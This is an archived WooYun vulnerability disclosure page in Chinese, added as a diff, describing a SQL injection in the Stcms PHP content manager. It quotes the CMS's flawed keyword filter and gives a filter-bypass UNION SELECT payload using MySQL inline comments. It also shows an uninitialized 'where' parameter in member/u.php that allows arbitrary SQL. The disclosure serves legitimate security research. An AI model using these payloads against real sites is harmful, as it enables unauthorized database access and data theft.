@@ -1,0 +1,260 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Stcms的一个sql注射  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Stcms的一个sql注射  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Zvall">Zvall</a> 
+</li><li>提交时间：		2012-07-27 10:31</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-27：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-09-10：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Sql 注入</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>$mysql = new mysql();<br />
+$search_arr = array(&quot;/\bunion /i&quot;,&quot;/\bselect /i&quot;,&quot;/\bupdate /i&quot;,&quot;/\boutfile /i&quot;,&quot;/\bor /i&quot;,&quot;/\bdelete /i&quot;,&quot;/\binsert /i&quot;); <br />
+$replace_arr = array(&quot;union&amp;nbsp;&quot;,&quot;select&amp;nbsp;&quot;,&quot;update&amp;nbsp;&quot;,&quot;outfile&amp;nbsp;&quot;,&quot;or&amp;nbsp;&quot;,&quot;delete&amp;nbsp;&quot;,&quot;insert&amp;nbsp;&quot;); <br />
+$_POST = stripSql($_POST,$search_arr,$replace_arr);<br />
+$_GET = stripSql($_GET,$search_arr,$replace_arr);<br />
+$_COOKIE = stripSql($_COOKIE,$search_arr,$replace_arr);<br />
+unset($search_arr, $replace_arr);<br />
+if(!get_magic_quotes_gpc()){<br />
+	$_POST = addslash($_POST);<br />
+	$_GET = addslash($_GET);<br />
+	$_COOKIE = addslash($_COOKIE);<br />
+	$_SERVER = addslash($_SERVER);<br />
+}<br />
+@extract($_POST, EXTR_SKIP);<br />
+@extract($_GET, EXTR_SKIP);<br />
+<br />
+<br />
+sriipSql:<br />
+<br />
+function stripSql($str,$search_arr,$replace_arr) {<br />
+	if(is_array($str)) {<br />
+		foreach($str as $key =&gt; $value) {<br />
+			$result[$key] = stripSql($value,$search_arr,$replace_arr);<br />
+		}<br />
+	} else {<br />
+		$result = preg_replace($search_arr,$replace_arr,$str);<br />
+	}<br />
+	return $result;<br />
+<br />
+把我们的 union+空格  替换成 union&amp;nbsp; <br />
+//这个过滤有些问题我们只要把空格替换诸如：+| N个空格| tab | enter | 等<br />
+<br />
+<br />
+index.php?8&#039;+/*!Union*/+/*!SelEct*/+1,2,3,4,version(),6,7,8,<br />
+<br />
+<br />
+<br />
+在magic_quotes_gpc关闭时 会调用 addslash过滤GET POST COOKIES<br />
+<br />
+Function addslash{<br />
+if(is_array($str)) {<br />
+		foreach($str as $key =&gt; $value) {<br />
+			$result[$key] = addslash($value);<br />
+		}<br />
+	} else {<br />
+		$result = @mysql_real_escape_string($str) ? mysql_real_escape_string($str) : addslashes($str);<br />
+	}<br />
+	return $result;<br />
+<br />
+调用mysql_real_escape_string函数来转义Sql语句中特殊字符，它有一个特征就是会考虑到连接的当前字符集<br />
+<br />
+除了<br />
+例如 Set names GBK  就是期望返回GKB集编码<br />
+<br />
+<br />
+上面说了mysql_real_escape_string会考虑当前连接的字符集<br />
+<br />
+除了mysql_set_charset 能改变默认字符集.其它的都是默认latin-1<br />
+<br />
+Mysql_real 这时使用的是默认的 导致和addslashes处理一样的效果<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+SQL注入<br />
+<br />
+<br />
+U.php 50-65行<br />
+<br />
+	case &#039;list&#039;:<br />
+	<br />
+		$totalNum = $mysql-&gt;numTable(&quot;member&quot;, $where);<br />
+		$pageNum = 20;<br />
+		$totalPage = intval($totalNum/$pageNum) == $totalNum/$pageNum ? $totalNum/$pageNum : intval($totalNum/$pageNum)+1;<br />
+		$page = $page ? $page : 1;<br />
+		$page = $page&gt;$totalPage ? $totalPage : $page;<br />
+		$page = $page&lt;1 ? 1 : $page;<br />
+		$members = $mysql-&gt;select(&quot;member&quot;,&quot;id,name,time,money,provience,city,picture&quot;,$where,array(&quot;id DESC&quot;),array(($page-1)*$pageNum,$pageNum));<br />
+		require(INCLUDE_PATH.&quot;page.class.php&quot;);<br />
+		$pageClass = new page($page,$totalNum,$pageNum, WEB_URL.&quot;member/u.php?action=list&quot;, true);<br />
+		$pageCode = $pageClass-&gt;getCode();<br />
+		$smarty-&gt;assign(&quot;webTitle&quot;,&quot;会员列表&quot;);<br />
+		$smarty-&gt;assign(&quot;uList&quot;, $members);<br />
+		$smarty-&gt;assign(&quot;pageCode&quot;, $pageCode);<br />
+		$smarty-&gt;display(&quot;member/m_u_list.html&quot;);<br />
+<br />
+<br />
+function numTable($table=&#039;&#039;,$wheres=false)<br />
+	{<br />
+		$table = $this-&gt;dbPrefix.$table;<br />
+		$sql = &quot;SELECT COUNT(*) AS num FROM `$table`&quot;;<br />
+		if($wheres)<br />
+		{<br />
+			$sql .= &quot; WHERE &quot;;<br />
+			if(is_array($wheres))<br />
+			{<br />
+				foreach($wheres as $key =&gt; $val)<br />
+				{<br />
+					$whr[] = &quot;`$key`=&#039;&quot;.$val.&quot;&#039;&quot;;<br />
+				}<br />
+				$sql .= implode(&quot; AND &quot;,$whr);<br />
+			}<br />
+			elseif(is_string($wheres))<br />
+			{<br />
+				$sql .= $wheres;<br />
+			}<br />
+		}<br />
+		$result = $this-&gt;fetch($this-&gt;query($sql));<br />
+		return $result[&#039;num&#039;];<br />
+	}<br />
+<br />
+Where 没初始化 导致可执行任意sql语句<br />
+http://localhost/stcms_html/member/u.php?action=list&amp;where={sql}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://localhost/stcms_html/member/u.php?action=list&amp;where={sql}  </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">变量要正确初始化 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Zvall" title="Zvall">Zvall</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-010198" title="Stcms的一个sql注射">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="10198";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
